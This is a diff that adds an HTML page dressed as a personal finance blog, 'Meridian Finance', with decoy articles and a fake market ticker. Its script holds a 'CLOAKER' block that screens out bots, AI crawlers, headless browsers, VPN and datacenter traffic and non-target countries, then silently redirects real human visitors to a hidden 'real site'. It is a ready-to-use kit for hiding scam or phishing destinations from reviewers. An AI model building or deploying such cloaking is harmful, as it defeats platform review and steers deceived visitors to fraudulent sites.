@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Meridian Finance — Smart Money, Smarter Life</title>
+  <meta name="description" content="Personal finance insights, investment strategies, and wealth-building guides for the modern investor.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --ink:      #0e0d0b;
+      --ink2:     #3a3832;
+      --ink3:     #7a7669;
+      --paper:    #f7f4ef;
+      --paper2:   #edeae3;
+      --gold:     #b8933a;
+      --gold-lt:  #e8d49a;
+      --rule:     #d5d0c6;
+      --serif:    'Playfair Display', Georgia, serif;
+      --sans:     'DM Sans', system-ui, sans-serif;
+      --max:      1160px;
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--paper);
+      color: var(--ink);
+      font-family: var(--sans);
+      font-size: 16px;
+      line-height: 1.6;
+      overflow-x: hidden;
+    }
+
+    /* ── NAV ── */
+    nav {
+      position: sticky; top: 0; z-index: 100;
+      background: var(--paper);
+      border-bottom: 1px solid var(--rule);
+      padding: 0 32px;
+    }
+    .nav-inner {
+      max-width: var(--max);
+      margin: 0 auto;
+      height: 64px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .logo {
+      font-family: var(--serif);
+      font-size: 1.35rem;
+      font-weight: 700;
+      letter-spacing: -0.01em;
+      color: var(--ink);
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .logo-mark {
+      width: 28px; height: 28px;
+      background: var(--ink);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .logo-mark svg { width: 14px; height: 14px; fill: var(--gold); }
+    .nav-links { display: flex; gap: 32px; list-style: none; }
+    .nav-links a {
+      font-size: .875rem; font-weight: 500; letter-spacing: .02em;
+      color: var(--ink2); text-decoration: none; text-transform: uppercase;
+      transition: color .2s;
+    }
+    .nav-links a:hover { color: var(--gold); }
+    .nav-cta {
+      background: var(--ink); color: var(--paper) !important;
+      padding: 8px 20px; border-radius: 3px;
+      transition: background .2s !important;
+    }
+    .nav-cta:hover { background: var(--gold) !important; color: var(--ink) !important; }
+
+    /* ── HERO ── */
+    .hero {
+      max-width: var(--max); margin: 0 auto;
+      padding: 80px 32px 64px;
+      display: grid; grid-template-columns: 1fr 1fr;
+      gap: 64px; align-items: center;
+    }
+    .hero-kicker {
+      display: inline-flex; align-items: center; gap: 8px;
+      font-size: .75rem; font-weight: 500; letter-spacing: .12em;
+      text-transform: uppercase; color: var(--gold); margin-bottom: 20px;
+    }
+    .hero-kicker::before { content:''; display:block; width:24px; height:1px; background:var(--gold); }
+    .hero h1 {
+      font-family: var(--serif); font-size: clamp(2.4rem,4vw,3.4rem);
+      font-weight: 700; line-height: 1.15; letter-spacing: -0.02em;
+      color: var(--ink); margin-bottom: 24px;
+    }
+    .hero h1 em { font-style: italic; color: var(--gold); }
+    .hero-sub { font-size: 1.05rem; color: var(--ink2); line-height: 1.75; margin-bottom: 40px; max-width: 420px; }
+    .hero-actions { display: flex; align-items: center; gap: 24px; flex-wrap: wrap; }
+    .btn-primary {
+      background: var(--ink); color: var(--paper);
+      padding: 14px 32px; border-radius: 3px;
+      font-size: .9rem; font-weight: 500; letter-spacing: .04em;
+      text-decoration: none; text-transform: uppercase;
+      transition: background .2s, transform .15s;
+    }
+    .btn-primary:hover { background: var(--gold); color: var(--ink); transform: translateY(-1px); }
+    .btn-ghost {
+      font-size: .875rem; color: var(--ink2); text-decoration: none;
+      display: flex; align-items: center; gap: 6px; transition: color .2s;
+    }
+    .btn-ghost:hover { color: var(--gold); }
+    .btn-ghost svg { width: 16px; height: 16px; }
+
+    /* Hero card */
+    .hero-card {
+      background: var(--ink); border-radius: 8px;
+      padding: 40px 36px; color: var(--paper);
+      position: relative; overflow: hidden;
+    }
+    .hero-card::before {
+      content:''; position:absolute; top:-40px; right:-40px;
+      width:200px; height:200px; border-radius:50%;
+      border:1px solid rgba(184,147,58,.2);
+    }
+    .hero-card::after {
+      content:''; position:absolute; top:-80px; right:-80px;
+      width:300px; height:300px; border-radius:50%;
+      border:1px solid rgba(184,147,58,.1);
+    }
+    .card-label { font-size:.7rem; font-weight:500; letter-spacing:.14em; text-transform:uppercase; color:var(--gold-lt); margin-bottom:8px; }
+    .card-value { font-family:var(--serif); font-size:3rem; font-weight:700; color:#fff; line-height:1; margin-bottom:4px; }
+    .card-change { display:inline-flex; align-items:center; gap:4px; font-size:.8rem; color:#6ee7b7; margin-bottom:32px; }
+    .sparkline { width:100%; height:60px; }
+    .sparkline path { fill:none; stroke:var(--gold); stroke-width:2; }
+    .sparkline-fill { fill:rgba(184,147,58,.15); stroke:none; }
+    .card-stats {
+      display:grid; grid-template-columns:1fr 1fr; gap:1px;
+      background:rgba(255,255,255,.08); border-radius:6px; overflow:hidden; margin-top:24px;
+    }
+    .stat { background:rgba(255,255,255,.04); padding:16px; }
+    .stat-label { font-size:.7rem; letter-spacing:.1em; text-transform:uppercase; color:rgba(255,255,255,.4); margin-bottom:4px; }
+    .stat-val { font-size:1.1rem; font-weight:500; color:#fff; }
+    .badge-row { display:flex; gap:8px; margin-top:20px; flex-wrap:wrap; }
+    .badge { font-size:.7rem; font-weight:500; letter-spacing:.06em; text-transform:uppercase; padding:5px 10px; border-radius:3px; background:rgba(184,147,58,.15); color:var(--gold-lt); }
+
+    /* ── TICKER ── */
+    .ticker-wrap { border-top:1px solid var(--rule); border-bottom:1px solid var(--rule); background:var(--paper2); overflow:hidden; padding:10px 0; }
+    .ticker-track { display:flex; width:max-content; animation:ticker 30s linear infinite; }
+    .ticker-item { display:flex; align-items:center; gap:8px; padding:0 32px; font-size:.8rem; font-weight:500; white-space:nowrap; border-right:1px solid var(--rule); }
+    .ticker-sym { font-weight:700; color:var(--ink); }
+    .ticker-price { color:var(--ink2); }
+    .up { color:#16a34a; } .down { color:#dc2626; }
+    @keyframes ticker { 0%{transform:translateX(0)} 100%{transform:translateX(-50%)} }
+
+    /* ── SECTION HEADER ── */
+    .section-header {
+      max-width:var(--max); margin:0 auto;
+      padding:72px 32px 40px;
+      display:flex; align-items:flex-end; justify-content:space-between;
+      border-bottom:1px solid var(--rule);
+    }
+    .section-header h2 { font-family:var(--serif); font-size:clamp(1.6rem,2.5vw,2.2rem); font-weight:700; letter-spacing:-0.015em; }
+    .section-header a { font-size:.8rem; letter-spacing:.08em; text-transform:uppercase; font-weight:500; color:var(--gold); text-decoration:none; display:flex; align-items:center; gap:6px; }
+
+    /* ── ARTICLES ── */
+    .articles { max-width:var(--max); margin:0 auto; padding:0 32px 72px; }
+    .articles-grid { display:grid; grid-template-columns:2fr 1fr 1fr; gap:1px; background:var(--rule); border:1px solid var(--rule); }
+    .article-card {
+      background:var(--paper); padding:36px 32px;
+      display:flex; flex-direction:column; gap:12px;
+      text-decoration:none; color:inherit; transition:background .2s;
+    }
+    .article-card:hover { background:#f0ece4; }
+    .article-card.featured { grid-row:span 2; }
+    .article-tag { font-size:.68rem; font-weight:500; letter-spacing:.1em; text-transform:uppercase; color:var(--gold); }
+    .article-title { font-family:var(--serif); font-weight:700; line-height:1.25; color:var(--ink); }
+    .article-card.featured .article-title { font-size:1.5rem; }
+    .article-card:not(.featured) .article-title { font-size:1.05rem; }
+    .article-excerpt { font-size:.875rem; color:var(--ink2); line-height:1.65; flex:1; }
+    .article-meta { display:flex; align-items:center; gap:12px; font-size:.75rem; color:var(--ink3); padding-top:12px; border-top:1px solid var(--rule); }
+    .author-dot { width:24px; height:24px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; font-size:.65rem; font-weight:700; color:var(--paper); }
+
+    /* ── NEWSLETTER ── */
+    .newsletter { background:var(--ink); padding:80px 32px; }
+    .newsletter-inner { max-width:600px; margin:0 auto; text-align:center; }
+    .newsletter h2 { font-family:var(--serif); font-size:2rem; font-weight:700; color:#fff; margin-bottom:12px; }
+    .newsletter p { color:rgba(255,255,255,.55); margin-bottom:32px; font-size:.95rem; }
+    .newsletter-form { display:flex; border-radius:4px; overflow:hidden; max-width:480px; margin:0 auto; border:1px solid rgba(255,255,255,.15); }
+    .newsletter-form input { flex:1; background:rgba(255,255,255,.07); border:none; padding:14px 20px; font-size:.9rem; color:#fff; font-family:var(--sans); outline:none; }
+    .newsletter-form input::placeholder { color:rgba(255,255,255,.3); }
+    .newsletter-form button { background:var(--gold); border:none; padding:14px 24px; font-family:var(--sans); font-size:.8rem; font-weight:600; letter-spacing:.08em; text-transform:uppercase; color:var(--ink); cursor:pointer; transition:opacity .2s; white-space:nowrap; }
+    .newsletter-form button:hover { opacity:.85; }
+
+    /* ── TOPICS ── */
+    .topics { max-width:var(--max); margin:0 auto; padding:72px 32px; }
+    .topics-label { font-size:.7rem; font-weight:500; letter-spacing:.14em; text-transform:uppercase; color:var(--ink3); margin-bottom:24px; }
+    .topics-pills { display:flex; flex-wrap:wrap; gap:10px; }
+    .pill { border:1px solid var(--rule); border-radius:3px; padding:9px 18px; font-size:.8rem; font-weight:500; color:var(--ink2); text-decoration:none; transition:all .15s; }
+    .pill:hover { border-color:var(--ink); background:var(--ink); color:var(--paper); }
+    .pill.active { background:var(--gold); border-color:var(--gold); color:var(--ink); }
+
+    /* ── FOOTER ── */
+    footer { border-top:1px solid var(--rule); padding:48px 32px; background:var(--paper2); }
+    .footer-inner { max-width:var(--max); margin:0 auto; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:24px; }
+    .footer-copy { font-size:.8rem; color:var(--ink3); }
+    .footer-links { display:flex; gap:24px; list-style:none; }
+    .footer-links a { font-size:.75rem; letter-spacing:.06em; text-transform:uppercase; color:var(--ink3); text-decoration:none; }
+    .footer-links a:hover { color:var(--gold); }
+
+    /* ── ANIMATIONS ── */
+    .fade-in { opacity:0; transform:translateY(20px); animation:fadeUp .6s ease forwards; }
+    @keyframes fadeUp { to { opacity:1; transform:translateY(0); } }
+    .delay-1{animation-delay:.1s} .delay-2{animation-delay:.2s} .delay-3{animation-delay:.3s} .delay-4{animation-delay:.4s}
+
+    @media(max-width:860px){
+      .hero{grid-template-columns:1fr;gap:40px}
+      .articles-grid{grid-template-columns:1fr}
+      .article-card.featured{grid-row:span 1}
+      .nav-links{display:none}
+    }
+  </style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-inner">
+    <a class="logo" href="#">
+      <span class="logo-mark">
+        <svg viewBox="0 0 20 20"><path d="M10 2L3 7v11h5v-6h4v6h5V7L10 2z"/></svg>
+      </span>
+      Meridian Finance
+    </a>
+    <ul class="nav-links">
+      <li><a href="#">Markets</a></li>
+      <li><a href="#">Investing</a></li>
+      <li><a href="#">Retirement</a></li>
+      <li><a href="#">Tax &amp; Planning</a></li>
+      <li><a href="#" class="nav-cta">Subscribe</a></li>
+    </ul>
+  </div>
+</nav>
+
+<div class="ticker-wrap">
+  <div class="ticker-track" id="ticker"></div>
+</div>
+
+<section class="hero">
+  <div>
+    <div class="hero-kicker fade-in">Editor's pick</div>
+    <h1 class="fade-in delay-1">Build <em>real wealth</em> in the decade ahead</h1>
+    <p class="hero-sub fade-in delay-2">Independent analysis, actionable strategies, and the unfiltered truth about personal finance — written by practitioners, not pundits.</p>
+    <div class="hero-actions fade-in delay-3">
+      <a href="#articles" class="btn-primary">Start Reading</a>
+      <a href="#newsletter" class="btn-ghost">
+        Free weekly digest
+        <svg viewBox="0 0 16 16" fill="none"><path d="M3 8h10M9 4l4 4-4 4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </a>
+    </div>
+  </div>
+  <div class="fade-in delay-4">
+    <div class="hero-card">
+      <div class="card-label">S&amp;P 500 · Live</div>
+      <div class="card-value" id="spx-val">5,842.91</div>
+      <div class="card-change">
+        <svg width="10" height="10" viewBox="0 0 10 10"><path d="M5 2L9 8H1L5 2z" fill="currentColor"/></svg>
+        +0.84% today
+      </div>
+      <svg class="sparkline" viewBox="0 0 280 60" preserveAspectRatio="none">
+        <path class="sparkline-fill" d="M0 45 C20 42 40 38 60 35 C80 30 100 28 120 22 C140 16 160 20 180 15 C200 10 220 12 240 8 C260 5 270 6 280 4 L280 60 L0 60 Z"/>
+        <path d="M0 45 C20 42 40 38 60 35 C80 30 100 28 120 22 C140 16 160 20 180 15 C200 10 220 12 240 8 C260 5 270 6 280 4"/>
+      </svg>
+      <div class="card-stats">
+        <div class="stat"><div class="stat-label">YTD Return</div><div class="stat-val" style="color:#6ee7b7">+14.3%</div></div>
+        <div class="stat"><div class="stat-label">P/E Ratio</div><div class="stat-val">24.1x</div></div>
+        <div class="stat"><div class="stat-label">52-wk High</div><div class="stat-val">6,147</div></div>
+        <div class="stat"><div class="stat-label">Dividend Yld</div><div class="stat-val">1.28%</div></div>
+      </div>
+      <div class="badge-row">
+        <span class="badge">Equities</span>
+        <span class="badge">Index</span>
+        <span class="badge">US Markets</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="section-header" id="articles">
+  <h2>Latest Analysis</h2>
+  <a href="#">All articles →</a>
+</div>
+<section class="articles">
+  <div class="articles-grid">
+    <a class="article-card featured" href="#">
+      <div class="article-tag">Deep Dive · Investing</div>
+      <div class="article-title">The 60/40 portfolio is dead — here's what actually works in a high-rate world</div>
+      <div class="article-excerpt">For decades the 60/40 stock-bond split was gospel. Then 2022 happened, and both legs collapsed simultaneously. We break down what the new diversification toolkit looks like — and why most advisors are still catching up.</div>
+      <div class="article-meta">
+        <span class="author-dot" style="background:#b8933a">JK</span>
+        James Keller · Dec 14, 2024 · 9 min read
+      </div>
+    </a>
+    <a class="article-card" href="#">
+      <div class="article-tag">Tax Strategy</div>
+      <div class="article-title">Mega backdoor Roth: the $66k move most people miss</div>
+      <div class="article-excerpt">If your employer allows after-tax 401(k) contributions, you may have a rarely-used path to shelter substantially more than the standard limit.</div>
+      <div class="article-meta"><span class="author-dot" style="background:#6366f1">SM</span> Sara Metz · Dec 12, 2024</div>
+    </a>
+    <a class="article-card" href="#">
+      <div class="article-tag">Real Estate</div>
+      <div class="article-title">Buy vs rent math in 2025: a city-by-city breakdown</div>
+      <div class="article-excerpt">Mortgage rates near 7%, rents softening in sunbelt metros — the calculus has shifted. We ran the numbers for 30 major cities.</div>
+      <div class="article-meta"><span class="author-dot" style="background:#0d9488">RC</span> R. Chen · Dec 11, 2024</div>
+    </a>
+    <a class="article-card" href="#">
+      <div class="article-tag">Markets</div>
+      <div class="article-title">What a soft landing actually means for your bond allocation</div>
+      <div class="article-excerpt">The Fed signalled 75bps of cuts for 2025. Duration risk is back on the table. Here's how to position the fixed-income sleeve of your portfolio.</div>
+      <div class="article-meta"><span class="author-dot" style="background:#b8933a">JK</span> James Keller · Dec 10, 2024</div>
+    </a>
+    <a class="article-card" href="#">
+      <div class="article-tag">Retirement</div>
+      <div class="article-title">The sequence-of-returns trap: why your first decade of retirement is everything</div>
+      <div class="article-excerpt">A bad market in year two of retirement can permanently derail a portfolio that looked fine on paper. How to protect against it.</div>
+      <div class="article-meta"><span class="author-dot" style="background:#dc2626">AL</span> A. Lin · Dec 8, 2024</div>
+    </a>
+  </div>
+</section>
+
+<div style="border-top:1px solid var(--rule)">
+  <div class="topics">
+    <div class="topics-label">Browse by topic</div>
+    <div class="topics-pills">
+      <a class="pill active" href="#">All</a>
+      <a class="pill" href="#">Investing</a>
+      <a class="pill" href="#">Retirement</a>
+      <a class="pill" href="#">Tax Strategy</a>
+      <a class="pill" href="#">Real Estate</a>
+      <a class="pill" href="#">ETFs &amp; Index Funds</a>
+      <a class="pill" href="#">Crypto</a>
+      <a class="pill" href="#">Insurance</a>
+      <a class="pill" href="#">Budgeting</a>
+      <a class="pill" href="#">Side Income</a>
+      <a class="pill" href="#">Options</a>
+      <a class="pill" href="#">401(k) &amp; IRAs</a>
+    </div>
+  </div>
+</div>
+
+<section class="newsletter" id="newsletter">
+  <div class="newsletter-inner">
+    <h2>The Weekly Brief</h2>
+    <p>One email, every Sunday. Market recap, one deep-dive, and three actionable ideas — no fluff, no ads.</p>
+    <div class="newsletter-form">
+      <input type="email" placeholder="your@email.com">
+      <button type="button">Subscribe free</button>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div style="font-family:var(--serif);font-weight:700;margin-bottom:6px;">Meridian Finance</div>
+      <div class="footer-copy">© 2024 Meridian Media LLC. Not financial advice.</div>
+    </div>
+    <ul class="footer-links">
+      <li><a href="#">About</a></li>
+      <li><a href="#">Contact</a></li>
+      <li><a href="#">Privacy</a></li>
+      <li><a href="#">Disclaimer</a></li>
+      <li><a href="#">RSS</a></li>
+    </ul>
+  </div>
+</footer>
+
+<script>
+// ═══════════════════════════════════════════════════════════════════════════════
+// CLOAKER — edit the two lines below, leave everything else alone
+// ═══════════════════════════════════════════════════════════════════════════════
+const REAL_SITE         = 'https://YOUR-REAL-SITE.com';    // ← your real site URL
+const ALLOWED_COUNTRIES = ['US', 'GB', 'CA', 'AU', 'NZ']; // ← allowed countries
+// ═══════════════════════════════════════════════════════════════════════════════
+
+(async () => {
+  const ua = navigator.userAgent || '';
+
+  // 1. USER AGENT CHECK
+  const BAD_UA = [
+    /bot/i,/crawl/i,/spider/i,/slurp/i,/scrape/i,/fetch/i,
+    /facebookexternalhit/i,/twitterbot/i,/linkedinbot/i,/whatsapp/i,
+    /applebot/i,/headlesschrome/i,/phantomjs/i,/selenium/i,
+    /puppeteer/i,/playwright/i,/python/i,/curl/i,/wget/i,
+    /ahrefsbot/i,/semrushbot/i,/dotbot/i,/mj12bot/i,/petalbot/i,
+    /yandexbot/i,/baiduspider/i,/gptbot/i,/ccbot/i,/claudebot/i,
+    /bytespider/i,/cohere/i,/anthropic/i,/openai/i,/perplexity/i,
+    /go-http-client/i,/java\//i,/okhttp/i,/axios/i,/scrapy/i,
+  ];
+  if (!ua || ua.length < 20)         return;
+  if (BAD_UA.some(p => p.test(ua)))  return;
+
+  // 2. HEADLESS / AUTOMATION TELLS
+  if (navigator.webdriver)                                   return;
+  if (!navigator.language)                                   return;
+  if ((navigator.languages || []).length === 0)              return;
+  if (/chrome/i.test(ua) && !window.chrome)                  return; // headless chrome
+  if (navigator.plugins?.length === 0 && !/firefox/i.test(ua)) return;
+  if (screen.width === 0 || screen.height === 0)             return;
+  if (/win/i.test(navigator.platform) && /mac/i.test(ua))   return;
+  if (/mac/i.test(navigator.platform) && /windows/i.test(ua)) return;
+
+  // 3. HUMAN BEHAVIOUR — must generate at least one real event within 6s
+  let human = false;
+  ['mousemove','mousedown','touchstart','scroll','keydown']
+    .forEach(e => window.addEventListener(e, () => human = true, { once:true, passive:true }));
+
+  await new Promise(resolve => {
+    const t = setInterval(() => { if (human) { clearInterval(t); resolve(); } }, 80);
+    setTimeout(() => { clearInterval(t); resolve(); }, 6000);
+  });
+  if (!human) return;
+
+  // 4. GEO + PROXY CHECK
+  try {
+    const r   = await fetch('http://ip-api.com/json/?fields=status,countryCode,proxy,hosting',
+                  { signal: AbortSignal.timeout(5000) });
+    const geo = await r.json();
+
+    if (!geo || geo.status !== 'success')             return;
+    if (geo.proxy || geo.hosting)                     return; // VPN / datacenter
+    if (!ALLOWED_COUNTRIES.includes(geo.countryCode)) return; // wrong country
+  } catch {
+    return; // geo failed → stay safe
+  }
+
+  // 5. ALL CLEAR — send to real site (replace = no back button)
+  await new Promise(r => setTimeout(r, 100 + Math.random() * 400));
+  window.location.replace(REAL_SITE);
+})();
+
+// ── BLOG UI ──────────────────────────────────────────────────────────────────
+const tickers = [
+  {sym:'SPY', price:'584.12',chg:'+0.84%',up:true},
+  {sym:'QQQ', price:'497.38',chg:'+1.12%',up:true},
+  {sym:'AAPL',price:'197.60',chg:'+0.43%',up:true},
+  {sym:'TSLA',price:'251.05',chg:'-1.22%',up:false},
+  {sym:'NVDA',price:'875.40',chg:'+2.10%',up:true},
+  {sym:'BTC', price:'67,420',chg:'+3.47%',up:true},
+  {sym:'GLD', price:'238.50',chg:'-0.18%',up:false},
+  {sym:'TLT', price:'94.80', chg:'+0.55%',up:true},
+  {sym:'DXY', price:'103.40',chg:'-0.09%',up:false},
+  {sym:'VIX', price:'13.82', chg:'-2.10%',up:false},
+];
+const track = document.getElementById('ticker');
+track.innerHTML = [...tickers,...tickers].map(t =>
+  `<div class="ticker-item">
+    <span class="ticker-sym">${t.sym}</span>
+    <span class="ticker-price">${t.price}</span>
+    <span class="${t.up?'up':'down'}">${t.chg}</span>
+  </div>`
+).join('');
+
+const vals = ['5,842.91','5,843.44','5,842.17','5,844.02','5,841.88'];
+let vi = 0;
+setInterval(() => {
+  document.getElementById('spx-val').textContent = vals[vi = (vi+1)%vals.length];
+}, 3400);
+</script>
+</body>
+</html>
